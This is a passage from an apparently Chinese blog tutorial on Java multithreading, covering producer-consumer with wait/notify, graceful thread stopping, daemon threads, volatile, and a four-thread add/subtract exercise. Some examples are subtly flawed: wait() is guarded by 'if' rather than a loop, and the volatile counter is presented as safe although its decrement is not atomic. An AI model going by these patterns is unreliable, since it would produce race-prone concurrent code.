class="line"></span><br><span class="line"><span class="comment">//生产者-消费者模型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Producer</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (x % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.msg.set(<span class="string">&quot;王健&quot;</span>, <span class="string">&quot;宇宙大帅哥&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.msg.set(<span class="string">&quot;小高&quot;</span>, <span class="string">&quot;猥琐第一人&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Message msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Consumer</span><span class="params">(Message msg)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.msg = msg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            System.out.println(x + <span class="built_in">this</span>.msg.get());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>; <span class="comment">//表示生产或消费的形式</span></span><br><span class="line">    <span class="comment">//flag = true:允许生产，但是不允许消费</span></span><br><span class="line">    <span class="comment">//flag = false:允许消费,不允许生产</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(String title, String content)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.flag) &#123; <span class="comment">//无法进行生产，应该等待被消费</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.content = content;</span><br><span class="line">        <span class="built_in">this</span>.flag = <span class="literal">false</span>; <span class="comment">//已经生产过了</span></span><br><span class="line">        <span class="built_in">super</span>.notify(); <span class="comment">//唤醒等待的线程</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title function_">get</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.flag == <span class="literal">true</span>) &#123; <span class="comment">//还未生产,需要等待</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.title + <span class="string">&quot; - &quot;</span> + <span class="built_in">this</span>.content;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123; <span class="comment">//不管如何都要执行</span></span><br><span class="line">            <span class="built_in">this</span>.flag = <span class="literal">true</span>;<span class="comment">//继续生产</span></span><br><span class="line">            <span class="built_in">super</span>.notify();<span class="comment">//唤醒等待线程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Message</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Producer</span>(msg)).start(); <span class="comment">//启动生产者线程</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Consumer</span>(msg)).start(); <span class="comment">//启动消费者线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073847.jpg"                      alt="image-20220808213715656"                ></p><p>​    注：这种处理形式就是在进行多线程开发过程之中最原始的处理方案，整个的等待、同步唤醒机制都有开发者自行通过原生代码实现控制。</p><hr><h3 id="多线程深入话题"><a href="#多线程深入话题" class="headerlink" title="多线程深入话题"></a>多线程深入话题</h3><h4 id="优雅的停止线程"><a href="#优雅的停止线程" class="headerlink" title="优雅的停止线程"></a>优雅的停止线程</h4><p>​    在多线程操作之中如果要启动多线程肯定使用的是 Thread 类中的 start() 方法，而如果对于多线程需要进行停止处理，Thread 类原本提供有 stop() 方法。但是对于这些方法从 JDK1.2 版本开始就已经将其废除了，而且一直到现在也不再建议出现在你的代码中.而除了 stop() 之外还有几个方法也被禁用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以下方法均禁用</span><br><span class="line">停止多线程: <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">stop</span><span class="params">()</span></span><br><span class="line">销毁多线程: <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span></span><br><span class="line">挂起线程: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">suspend</span><span class="params">()</span>、暂停执行</span><br><span class="line">恢复挂起的线程执行: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">resume</span><span class="params">()</span></span><br></pre></td></tr></table></figure><p>​    之所以废除掉这些方法，主要的原因是因为这些方法有可能导致线程的死锁。所以从 JDK1.2 开始就都不建议使用，如果要想实现线程的停止需要通过一种柔和的方式来进行。</p><p>范例:实现线程柔和的停止</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现线程柔和的停止</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test16</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="type">long</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (flag) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">40</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;正在运行、&quot;</span> + num++);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;执行线程&quot;</span>).start();</span><br><span class="line">        Thread.sleep(<span class="number">200</span>); <span class="comment">//运行200ms</span></span><br><span class="line">        flag = <span class="literal">false</span>; <span class="comment">//停止线程</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73848.jpg"                      alt="image-20220809011131124"                ></p><p>​    万一现在有其他的线程去控制这个flag的内容，那么这个时候对于线程的停止也不是说停就立刻停止的，而是会在执行中判断flag的内容来完成的。</p><h4 id="后台守护线程"><a href="#后台守护线程" class="headerlink" title="后台守护线程"></a>后台守护线程</h4><p>​    在多线程里面可以进行守护线程的定义，也就是说如果现在主线程的程序或者其它的线程还在执行的时候,线程将一直存在，并且运行在后台状态。</p><pre><code> 在 Thread 类里面提供有如下的守护线程的操作方法:</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置为守护线程: <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setDaemon</span><span class="params">(<span class="type">boolean</span> on)</span>;</span><br><span class="line">判断是否为守护线程:<span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">isDaemon</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure><p>范例：使用守护线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用守护线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test17</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">userThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;正在运行、x = &quot;</span> + x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;用户线程&quot;</span>); <span class="comment">//完成核心的业务</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Thread</span> <span class="variable">daemonThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; Integer.MAX_VALUE; x++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;正在运行、x = &quot;</span> + x);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;守护线程&quot;</span>); <span class="comment">//完成守护的业务</span></span><br><span class="line"></span><br><span class="line">        daemonThread.setDaemon(<span class="literal">true</span>); <span class="comment">//设置为守护线程</span></span><br><span class="line"></span><br><span class="line">        userThread.start();</span><br><span class="line">        daemonThread.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073849.jpg"                      alt="image-20220809012537963"                ></p><p>​    可以发现所有的守护线程都是围绕在用户线程的周围，如果程序执行完毕了，守护线程也就消失了在整个的 JVM 里面最大的守护线程就是 GC 线程。程序执行中 GC 线程会一直存在，如果程序执行完毕，GC 线程也将消失。</p><h4 id="volatile关键字"><a href="#volatile关键字" class="headerlink" title="volatile关键字"></a>volatile关键字</h4><p>​    多线程的定义之中，volatile 关键字主要是在属性定义上使用的，表示此属性为直接数据操作，而不进行副本的拷贝处理。</p><p>​    <strong>在正常进行变量处理的时候往往会经历如下的几个步骤：1、获取变量原有的数据内容副本；2、利用副本为变量进行数学计算；3、将计算后的变量，保存到原始空间之中；</strong></p><p>​    <strong>如果一个属性上追加了 volatile 关键字，表示的就是不使用副本，而是直接操作原始变量，相当于节约了拷贝副本，重新保存的步骤。</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73854.jpg"                      alt="image-20220809014237216"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread7</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">5</span>;<span class="comment">//直接内存操作</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">this</span>.ticket &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;卖票处理.ticket = &quot;</span>+<span class="built_in">this</span>.ticket -- );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test18</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread7</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread7</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;票贩子C&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073854.jpg"                      alt="image-20220809014407250"                ></p><p>​    <strong>解释 volatile 与 synchronized 的区别：</strong></p><p>​    <strong>1、volatile 无法描述同步的处理，它只是一种直接内存的处理，避免了副本的操作，而 synchronized 是实现同步的;</strong></p><p>​    <strong>2、volatile主要在属性上使用，而synchronized是在代码块与方法上使用的</strong>；</p><hr><h3 id="多线程综合案例"><a href="#多线程综合案例" class="headerlink" title="多线程综合案例"></a>多线程综合案例</h3><h4 id="数字加减"><a href="#数字加减" class="headerlink" title="数字加减"></a>数字加减</h4><p>​    设计4个线程对象，两个线程执行减操作，两个线程执行加操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//多线程案例一数字加减</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Resource</span> &#123; <span class="comment">//定义一个操作的资源</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//这个是要进行加减操作的数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>; <span class="comment">//加减的切换</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//flag = true,表示可以进行加法操作，但是无法进行减法操作</span></span><br><span class="line">    <span class="comment">//flag = false，表示可以进行减法操作，但是无法进行加法操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.flag == <span class="literal">false</span>)&#123; <span class="comment">//现在需要的是减法操作，加法操作要等待</span></span><br><span class="line">            <span class="built_in">super</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.num++;</span><br><span class="line">        System.out.println(<span class="string">&quot;【加法操作 - &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;】num = &quot;</span> + <span class="built_in">this</span>.num);</span><br><span class="line">        <span class="built_in">this</span>.flag = <span class="literal">false</span>; <span class="comment">//加法操作执行完毕，需要执行减法</span></span><br><span class="line">        <span class="built_in">super</span>.notifyAll(); <span class="comment">//唤醒全部进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.flag == <span class="literal">true</span>)&#123; <span class="comment">//减法操作需要等待</span></span><br><span class="line">            <span class="built_in">super</span>.wait();</span><br><span class="line">        &#125;</span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line">        <span class="built_in">this</span>.num--;</span><br><span class="line">        System.out.println(<span class="string">&quot;【减法操作 - &quot;</span> + Thread.currentThread().getName() + <span class="string">&quot;】num = &quot;</span> + <span class="built_in">this</span>.num);</span><br><span class="line">        <span class="built_in">this</span>.flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">super</span>.notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Resource resource;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AddThread</span><span class="params">(Resource resource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.resource = resource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x= <span class="number">0</span>;x &lt; <span class="number">50</span>;x++)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.resource.add();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Resource resource;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SubThread</span><span class="params">(Resource resource)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.resource = resource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x= <span class="number">0</span>;x &lt; <span class="number">50</span>;x++)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.resource.sub();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test19</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Resource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Resource</span>();</span><br><span class="line">        <span class="type">AddThread</span> <span class="variable">at</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AddThread</span>(resource);</span><br><span class="line">        <span class="type">SubThread</span> <span class="variable">st</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubThread</span>(resource);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(at,<span class="string">&quot;加法线程 - A&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(at,<span class="string">&quot;加法线程 - B&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(st,<span class="string">&quot;减法线程 - X&quot;</span>).start();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(st,<span class="string">&quot;减法线程 - X&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073856.jpg"                      alt="image-20220809021731661"                ></p><p>​    这个程序的核心本质在于：加一个，减一个，整体的计算结果应该只在0，-1，1之间循环出现。</p><h4 id="生产电脑"><a href="#生产电脑" class="headerlink" title="生产电脑"></a>生产电脑</h4><p>​    设计一个生产电脑和搬运电脑类，要求生产出一台电脑就搬走一台电脑，如果没有新的电脑生产出来，则搬运工要等待新电脑产出，如果生产出的电脑没有搬走，则要等待电脑搬走之后再生产，并统计出生产的电脑数量。</p><p>​    在本程序之中实现的就是一个标准的生产者与消费者的处理模型，实现操作的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 